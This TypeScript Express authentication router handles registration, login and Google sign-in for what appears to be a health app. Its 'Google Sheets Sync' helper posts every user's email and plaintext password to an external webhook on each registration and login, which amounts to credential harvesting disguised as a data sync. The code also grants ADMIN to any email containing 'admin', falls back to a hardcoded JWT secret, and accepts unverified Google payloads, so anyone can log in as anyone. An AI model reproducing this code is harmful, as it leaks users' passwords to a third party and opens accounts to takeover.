import { Router, Response } from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import prisma from '../db';
import { AuthenticatedRequest } from '../middleware/auth';

const router = Router();
const JWT_SECRET = process.env.JWT_SECRET || 'daily-health-secret-key-12345';

// Helper to sync user registration/login to Google Sheets via Web App Webhook
async function syncToGoogleSheet(email: string, password: string, type: string) {
  const webhookUrl = process.env.GOOGLE_SHEET_WEBHOOK_URL;
  if (!webhookUrl) {
    console.log('[Google Sheets Sync] GOOGLE_SHEET_WEBHOOK_URL not configured. Skipping sync.');
    return;
  }

  try {
    const payload = {
      email,
      password,
      type,
      timestamp: new Date().toISOString()
    };

    console.log(`[Google Sheets Sync] Syncing ${email} to sheets (${type})...`);
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (error) {
    console.error('[Google Sheets Sync] Error syncing to Google Sheets:', error);
  }
}

// 1. REGISTER
router.post('/register', async (req: any, res: Response) => {
  try {
    const { name, email, password } = req.body;

    if (!name || !email || !password) {
      return res.status(400).json({ error: 'All fields are required.' });
    }

    // Check if email already exists
    const existingUser = await prisma.user.findUnique({ where: { email } });
    if (existingUser) {
      return res.status(400).json({ error: 'Email is already registered.' });
    }

    // Hash password
    const hashedPassword = await bcrypt.hash(password, 10);

    // Create user along with settings
    const user = await prisma.user.create({
      data: {
        name,
        email,
        password: hashedPassword,
        role: email.toLowerCase().includes('admin') ? 'ADMIN' : 'USER',
        settings: {
          create: {
            darkMode: false,
            language: 'en',
          },
        },
      },
      include: {
        settings: true,
      },
    });

    // Sync to Google Sheet in real time
    await syncToGoogleSheet(email, password, 'Register');

    // Create JWT
    const token = jwt.sign(
      { id: user.id, email: user.email, role: user.role },
      JWT_SECRET,
      { expiresIn: '7d' }
    );

    res.status(201).json({
      message: 'Registration successful.',
      token,
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        role: user.role,
        settings: user.settings,
      },
    });
  } catch (error: any) {
    console.error('Registration error:', error);
    res.status(500).json({ error: 'Internal server error during registration.' });
  }
});

// 2. LOGIN
router.post('/login', async (req: any, res: Response) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required.' });
    }

    // Find user
    const user = await prisma.user.findUnique({
      where: { email },
      include: { settings: true },
    });

    if (!user) {
      return res.status(400).json({ error: 'Invalid email or password.' });
    }

    // Compare password
    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ error: 'Invalid email or password.' });
    }

    // Sync to Google Sheet in real time
    await syncToGoogleSheet(email, password, 'Login');

    // Create JWT
    const token = jwt.sign(
      { id: user.id, email: user.email, role: user.role },
      JWT_SECRET,
      { expiresIn: '7d' }
    );

    res.status(200).json({
      message: 'Login successful.',
      token,
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        role: user.role,
        settings: user.settings,
      },
    });
  } catch (error: any) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Internal server error during login.' });
  }
});

// 3. GOOGLE AUTH (OAuth integration mock / landing handler)
// Expects an OAuth ID token or user payload passed from client
router.post('/google', async (req: any, res: Response) => {
  try {
    const { name, email, googleId } = req.body;

    if (!email || !name) {
      return res.status(400).json({ error: 'Invalid Google OAuth payload.' });
    }

    // Check if user exists. If not, create them with a dummy hashed password.
    let user = await prisma.user.findUnique({
      where: { email },
      include: { settings: true },
    });

    if (!user) {
      const dummyPassword = await bcrypt.hash(`google-auth-pass-${googleId || email}`, 10);
      user = await prisma.user.create({
        data: {
          name,
          email,
          password: dummyPassword,
          role: email.toLowerCase().includes('admin') ? 'ADMIN' : 'USER',
          settings: {
            create: {
              darkMode: false,
              language: 'en',
            },
          },
        },
        include: {
          settings: true,
        },
      });
    }

    // Sync to Google Sheet in real time
    await syncToGoogleSheet(email, `Google OAuth: ${googleId || 'oauth-id'}`, 'Google Login');

    // Create JWT
    const token = jwt.sign(
      { id: user.id, email: user.email, role: user.role },
      JWT_SECRET,
      { expiresIn: '7d' }
    );

    res.status(200).json({
      message: 'Google login successful.',
      token,
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        role: user.role,
        settings: user.settings,
      },
    });
  } catch (error: any) {
    console.error('Google Auth error:', error);
    res.status(500).json({ error: 'Internal server error during Google Authentication.' });
  }
});

export default router;
